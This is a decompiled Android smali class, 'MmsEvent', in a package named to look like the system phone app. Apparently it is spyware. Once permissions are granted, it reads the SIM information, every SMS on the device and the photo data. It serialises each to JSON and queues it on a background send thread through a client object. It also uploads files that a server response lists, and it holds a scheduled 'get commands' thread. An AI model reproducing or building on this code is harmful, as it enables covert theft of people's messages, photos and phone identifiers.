.class public Lcom/android/phone/event/MmsEvent;
.super Ljava/lang/Object;
.source "MmsEvent.java"

# interfaces
.implements Landroid/support/v4/app/ActivityCompat$OnRequestPermissionsResultCallback;


# static fields
.field private static final DEBUG:Z

.field private static final PERMISSIONS:[Ljava/lang/String;

.field protected static final TAG:Ljava/lang/String;


# instance fields
.field private mActivity:Ljava/lang/ref/WeakReference;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/ref/WeakReference",
            "<",
            "Landroid/app/Activity;",
            ">;"
        }
    .end annotation
.end field

.field private mGetCmdsThread:Ljava/util/concurrent/ScheduledThreadPoolExecutor;

.field private mRealClient:Lcom/android/phone/client/RealClient;

.field private mSendThread:Ljava/util/concurrent/ExecutorService;

.field private mTextViewForDebug:Landroid/widget/TextView;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    .line 28
    const-class v0, Lcom/android/phone/event/MmsEvent;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/phone/event/MmsEvent;->TAG:Ljava/lang/String;

    .line 31
    const/4 v0, 0x5

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    .line 32
    const-string v2, "android.permission.READ_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    .line 33
    const-string v2, "android.permission.READ_EXTERNAL_STORAGE"

    aput-object v2, v0, v1

    const/4 v1, 0x2

    .line 34
    const-string v2, "android.permission.BROADCAST_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x3

    .line 35
    const-string v2, "android.permission.RECEIVE_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x4

    .line 36
    const-string v2, "android.permission.READ_PHONE_STATE"

    aput-object v2, v0, v1

    .line 31
    sput-object v0, Lcom/android/phone/event/MmsEvent;->PERMISSIONS:[Ljava/lang/String;

    .line 37
    return-void
.end method

.method constructor <init>(Landroid/app/Activity;)V
    .locals 1
    .param p1, "activity"    # Landroid/app/Activity;

    .prologue
    const/4 v0, 0x0

    .line 48
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 39
    iput-object v0, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    .line 40
    iput-object v0, p0, Lcom/android/phone/event/MmsEvent;->mActivity:Ljava/lang/ref/WeakReference;

    .line 44
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/util/concurrent/Executors;->newScheduledThreadPool(I)Ljava/util/concurrent/ScheduledExecutorService;

    move-result-object v0

    check-cast v0, Ljava/util/concurrent/ScheduledThreadPoolExecutor;

    iput-object v0, p0, Lcom/android/phone/event/MmsEvent;->mGetCmdsThread:Ljava/util/concurrent/ScheduledThreadPoolExecutor;

    .line 46
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/android/phone/event/MmsEvent;->mSendThread:Ljava/util/concurrent/ExecutorService;

    .line 49
    new-instance v0, Ljava/lang/ref/WeakReference;

    invoke-direct {v0, p1}, Ljava/lang/ref/WeakReference;-><init>(Ljava/lang/Object;)V

    iput-object v0, p0, Lcom/android/phone/event/MmsEvent;->mActivity:Ljava/lang/ref/WeakReference;

    .line 51
    new-instance v0, Lcom/android/phone/client/RealClient;

    invoke-direct {v0, p1}, Lcom/android/phone/client/RealClient;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/android/phone/event/MmsEvent;->mRealClient:Lcom/android/phone/client/RealClient;

    .line 52
    return-void
.end method

.method static synthetic access$0(Lcom/android/phone/event/MmsEvent;)Lcom/android/phone/client/RealClient;
    .locals 1

    .prologue
    .line 41
    iget-object v0, p0, Lcom/android/phone/event/MmsEvent;->mRealClient:Lcom/android/phone/client/RealClient;

    return-object v0
.end method


# virtual methods
.method protected eventUploadPicture(Ljava/lang/String;)V
    .locals 6
    .param p1, "res"    # Ljava/lang/String;

    .prologue
    .line 117
    invoke-static {p1}, Lcom/alibaba/fastjson/JSON;->parse(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/alibaba/fastjson/JSONObject;

    .line 119
    .local v2, "json":Lcom/alibaba/fastjson/JSONObject;
    const-string v3, "files"

    invoke-virtual {v2, v3}, Lcom/alibaba/fastjson/JSONObject;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/util/List;

    .line 120
    .local v1, "files":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    sget-object v3, Lcom/android/phone/event/MmsEvent;->TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "files:"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Lmms/log/DebugLog;->d(Ljava/lang/String;Ljava/lang/String;)V

    .line 121
    if-nez v1, :cond_1

    .line 129
    :cond_0
    return-void

    .line 125
    :cond_1
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 126
    .local v0, "file":Ljava/lang/String;
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mRealClient:Lcom/android/phone/client/RealClient;

    new-instance v5, Ljava/io/File;

    invoke-direct {v5, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v5}, Lcom/android/phone/client/RealClient;->updateFile(Ljava/io/File;)Ljava/lang/String;

    goto :goto_0
.end method

.method public getPermission()V
    .locals 3

    .prologue
    .line 59
    iget-object v1, p0, Lcom/android/phone/event/MmsEvent;->mActivity:Ljava/lang/ref/WeakReference;

    invoke-virtual {v1}, Ljava/lang/ref/WeakReference;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/Activity;

    .line 60
    .local v0, "activity":Landroid/app/Activity;
    invoke-static {}, Lcom/android/phone/permission/PermissionHelper;->getInstance()Lcom/android/phone/permission/PermissionHelper;

    move-result-object v1

    sget-object v2, Lcom/android/phone/event/MmsEvent;->PERMISSIONS:[Ljava/lang/String;

    invoke-virtual {v1, v0, v2}, Lcom/android/phone/permission/PermissionHelper;->getPermission(Landroid/app/Activity;[Ljava/lang/String;)V

    .line 61
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 6
    .param p1, "requestCode"    # I
    .param p2, "permissions"    # [Ljava/lang/String;
    .param p3, "grantResults"    # [I

    .prologue
    .line 66
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mActivity:Ljava/lang/ref/WeakReference;

    invoke-virtual {v4}, Ljava/lang/ref/WeakReference;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/Activity;

    .line 68
    .local v0, "activity":Landroid/app/Activity;
    invoke-static {v0}, Lcom/android/phone/info/PhoneInfoUtils;->getSimInfoBySubscriptionManager(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v4

    invoke-static {v4}, Lcom/alibaba/fastjson/JSON;->toJSONString(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .line 69
    .local v2, "simInfo":Ljava/lang/String;
    invoke-static {v2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 70
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    const-string v5, "\n----------------------------------------\n"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 71
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    invoke-virtual {v4, v2}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 73
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mSendThread:Ljava/util/concurrent/ExecutorService;

    new-instance v5, Lcom/android/phone/event/MmsEvent$1;

    invoke-direct {v5, p0, v2}, Lcom/android/phone/event/MmsEvent$1;-><init>(Lcom/android/phone/event/MmsEvent;Ljava/lang/String;)V

    invoke-interface {v4, v5}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    .line 83
    :cond_0
    invoke-static {v0}, Lcom/android/phone/mms/SmsReadHelper;->getSmsDataInPhone(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v4

    invoke-static {v4}, Lcom/alibaba/fastjson/JSON;->toJSONString(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    .line 84
    .local v3, "smsInPhone":Ljava/lang/String;
    invoke-static {v3}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_1

    .line 85
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    const-string v5, "\n----------------------------------------\n"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 86
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    invoke-virtual {v4, v3}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 88
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mSendThread:Ljava/util/concurrent/ExecutorService;

    new-instance v5, Lcom/android/phone/event/MmsEvent$2;

    invoke-direct {v5, p0, v3}, Lcom/android/phone/event/MmsEvent$2;-><init>(Lcom/android/phone/event/MmsEvent;Ljava/lang/String;)V

    invoke-interface {v4, v5}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    .line 99
    :cond_1
    invoke-static {v0}, Lcom/android/phone/picture/PhotoReadHelper;->getPhotoDataInPhone(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v4

    invoke-static {v4}, Lcom/alibaba/fastjson/JSON;->toJSONString(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 100
    .local v1, "photoInPhone":Ljava/lang/String;
    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    .line 101
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    const-string v5, "\n----------------------------------------\n"

    invoke-virtual {v4, v5}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 102
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    invoke-virtual {v4, v1}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V

    .line 104
    iget-object v4, p0, Lcom/android/phone/event/MmsEvent;->mSendThread:Ljava/util/concurrent/ExecutorService;

    new-instance v5, Lcom/android/phone/event/MmsEvent$3;

    invoke-direct {v5, p0, v1}, Lcom/android/phone/event/MmsEvent$3;-><init>(Lcom/android/phone/event/MmsEvent;Ljava/lang/String;)V

    invoke-interface {v4, v5}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    .line 114
    :cond_2
    return-void
.end method

.method public setTextView(Landroid/widget/TextView;)V
    .locals 0
    .param p1, "textView"    # Landroid/widget/TextView;

    .prologue
    .line 55
    iput-object p1, p0, Lcom/android/phone/event/MmsEvent;->mTextViewForDebug:Landroid/widget/TextView;

    .line 56
    return-void
.end method
